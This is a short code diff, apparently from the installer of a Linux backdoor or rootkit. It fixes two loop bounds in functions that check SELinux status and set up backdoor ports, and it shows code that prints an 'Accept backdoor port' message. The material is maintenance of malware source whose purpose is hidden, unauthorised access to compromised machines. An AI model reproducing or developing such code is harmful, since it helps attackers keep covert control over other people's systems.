@@ -38,7 +38,7 @@ int chkselinux(void){
     memset(line, 0, sizeof(line));
 
     while(fgets(line, sizeof(line), fp) != NULL && !badselinux)
-        for(int i=0; i!=sizeofarr(noselinux) && !badselinux; i++)
+        for(int i=0; i<sizeofarr(noselinux) && !badselinux; i++)
             if(!strncmp(noselinux[i], line, strlen(noselinux[i])))
                 badselinux=1;
 
@@ -159,7 +159,7 @@ void bdvinstall(char *const argv[]){
     char portsbuf[512], tmp[8];
     size_t tmplen, buflen;
     memset(portsbuf, 0, sizeof(portsbuf));
-    for(int i=0; i != BDVLPORTS_SIZE; i++){
+    for(int i=0; i < BDVLPORTS_SIZE; i++){
 #ifdef USE_ACCEPT_BD
         if(i == 0){
             printf("Accept backdoor port:\n  \e[1;31m%d\e[0m\n", bdvlports[i]);
